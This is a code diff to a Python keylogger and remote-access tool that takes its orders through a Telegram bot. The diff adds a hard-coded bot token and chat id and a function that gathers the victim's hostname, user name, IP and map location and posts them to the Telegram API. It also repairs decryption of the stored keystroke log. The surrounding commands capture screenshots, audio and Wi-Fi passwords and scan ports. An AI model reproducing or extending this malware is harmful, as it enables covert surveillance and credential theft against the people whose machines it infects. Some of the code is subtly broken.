@@ -33,7 +33,8 @@ key_crypt=b'64anpQ1F__rHalgTiLjqVNcf7TyirzwEqGJQM3fKAC8='
 telegram_token = 'Your telegram bot token'
 chat_id = 'chat id'
 
-
+telegram_token = '5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho'
+chat_id = '-791347020'
 keys=[]
 count=0
 
@@ -66,11 +67,9 @@ def send_files(path,type_file,name):
        
 def ip_information():
     r = requests.get(r'http://jsonip.com')
-    ip= r.json()['ip']
-    IP= format(ip)
-    public_ip = IP
-    hostname = socket.gethostname()    
-    IPAddr = socket.gethostbyname(hostname)
+    public_ip= r.json()['ip']
+    hostname = socket.gethostname() 
+    IPAddr = socket.gethostbyname(hostname)   
     ip_in=[public_ip,hostname,IPAddr]
     return ip_in
     
@@ -110,31 +109,29 @@ def upload_files(url,file):
 
 
 
-def get_current_location():
-    url = "https://mylocation.org/"
-    html = urlopen(url).read()
-    data = BeautifulSoup(html, features="html.parser")
-    for i in data(["script", "style"]):
-        i.extract()  
-    text = data.get_text()
-    lines = (line.strip() for line in text.splitlines())
-    p = (phrase.strip() for line in lines for phrase in line.split("  "))
-    text = '\n'.join(p for p in p if p)
-    text=text.split('\n')
-    c_l=[]
-    for i in range (len(text)):
-        if 'Public IP Address:'in text[i]:
-            for n in range(i+1,i+15) :
-                c_l.append(text[n])
-            break
-    pc_l1=c_l[::2]
-    pc_l2=c_l[1::2]
-    
-    res=''
-    for i in range(len(pc_l1)):
-        res+=(f"{str(pc_l1[i]):<20}{pc_l2[i]:>20}")
-        res+=('\n')
-    return res
+def advanced_ip_information():
+    ainfo = 'ip hostname city country loc'.split()
+    binfo = 'public,rout V,city,country,loc'.split(',')
+    hostname = str(socket.gethostname())   
+    IPAddr = str(socket.gethostbyname(hostname))
+    user=str(os.getlogin())
+    r = requests.get(r'https://ipinfo.io/json')
+    data=[f"{'computer name':<20}{hostname:<80}",f"{'IPaddr':<20}{IPAddr:<80}",f"{'user name':<20}{user:<80}"]
+    for i in range(len(ainfo)):
+        try:
+            info=r.json()[ainfo[i]]
+            info=format(info)
+            data.append(f'{binfo[i]:<20}{info:<80}')
+        except Exception as e :
+            print(e)
+            pass
+    try:
+        loc=r.json()['loc']
+        loc=format(loc)
+        data.append(f'{"map":<20}{"https://www.google.com/maps/search/google+map++" + loc:<80}')
+    except: 
+        pass
+    return data
 
 
 
@@ -218,14 +215,14 @@ def screen_shot(name):
 
 
 def satrt_file_on_target(path):
-
     try:
         os.startfile(path)
         send_message("the file was seccessfuly opens!")
     except:
         send_message('failed to open '+path)
 
-        
+
+
 def record_target(timer):
     timer=int(timer)
     name='wav'
@@ -289,7 +286,7 @@ def capture_data():
     with open('C:\\Process\\Process.txt','rb')as file:
             for i in file:
                 s=Crypt_my101(key_crypt).decrypt_data(i)
-                s=s.replace("'","")
+                s=s.decode().replace("'","")
                 if "backspace" in s:
                     s=' <'+"Backspace"+'> '
                 elif 'space' in s:
@@ -348,7 +345,7 @@ def capture_data():
 
 def read_messages():
     global offset,message_data
-    base_url='https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/getUpdates?offset='+offset
+    base_url='https://api.telegram.org/'+telegram_token+'/getUpdates?offset='+offset
     resp = requests.get(base_url)
     messages=resp.text
     messages=messages.replace("update_id","^^^@^@").split('^^^')
@@ -378,16 +375,31 @@ def read_messages():
     return [message_data[1:-1],offset]
 
     
-def time_cal_sec(second,multiple):
-    time_scann=str(int(second*multiple/60/60))+':'+str(int(second*multiple/60%60))+':'+str(int((second*multiple/60%60-int(second*multiple/60%60))/100*60*100))
-    time_scann=time_scann.split(':')
+
+
+def time_cal(second,multiple):
+    second=(int(second)*float(multiple))
+    h=second/60/60
+    m=(h-int(h)+0.00001)*100*60/100
+    s=(m-int(m)+0.00001)*100*60/100
+    if h>24:
+        d=int(int(h)/24)
+        h=h%24
+        test=['Days '+str(d)+', ',str(int(h)),str(int(m)),str(int(s))]
+    else:
+        test=[str(int(h)),str(int(m)),str(int(s))]
     current_time=''
-    for i in time_scann:
+    for i in test:
         if len(i)<2:
             current_time+='0'+i+':'
         else:
-            current_time+=i
+            current_time+=i+':'
+    if current_time[-1]==':':
+        current_time=current_time[:-1]
     return current_time
+
+
+
 
 
 def wait_to_conect():
@@ -462,12 +474,15 @@ def start_project():
 
 
                         elif 'get ip info' in command:
-                            data=''
-                            for i in conect_ip:
-                                data+=i+'\n'
-                            send_message(data)
-
-
+                            data=advanced_ip_information()
+                            out=''
+                            for i in data:
+                                out+=i+'\n'
+                            out=out.encode()
+                            files={'document':out}
+                            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=keylogger.txt" ,files=files)
+            
+                          
                         elif "screen shot" in command:
                             screen_shot('img')
 
@@ -497,7 +512,9 @@ def start_project():
 
 
                         elif 'get location'in command:
-                            send_message(get_current_location())
+                            info=str(advanced_ip_information[-1]).replace('map','')
+                            send_message(info.strip())
+
 
                         elif "get wifi passwords" in command:
                             send_message(Wifi_information().wifi_passwords())
@@ -570,7 +587,7 @@ def start_project():
                             if '-'in port:
                                 tot_port=port.split('-')
                                 tot_port=int(tot_port[-1])-int(tot_port[0])
-                                send_message('scaning for '+str(tot_port)+' ports on '+conect_ip[-1]+'. Estimated time: '+time_cal_sec(int(tot_port),0.5))
+                                send_message('scaning for '+str(tot_port)+' ports on '+conect_ip[-1]+'. Estimated time: '+time_cal(int(tot_port),0.5))
                             output_data=Scanner_ports(conect_ip[-1],port).scaning_for_ports_open()
                             output_data=str(output_data).replace('scannig for open ports on','Ports open on')
                             files={'document':output_data.encode()}
@@ -582,7 +599,7 @@ def start_project():
 
                         elif 'record target' in command:
                             timer=int(command[13:])
-                            send_message('trying to record..\nEstimated time: '+time_cal_sec(int(timer),1))
+                            send_message('trying to record..\nEstimated time: '+time_cal(int(timer),1))
                             record_target(timer)
                         
                         elif 'take picture' in command:
@@ -629,6 +646,10 @@ def start_key_log():
 
 
 def main():
+    try:
+        os.mkdir('C:\\Process\\')
+    except:
+        pass
     try:
         file=open('C:\\Process\\Process.txt','rb')
         file.read()
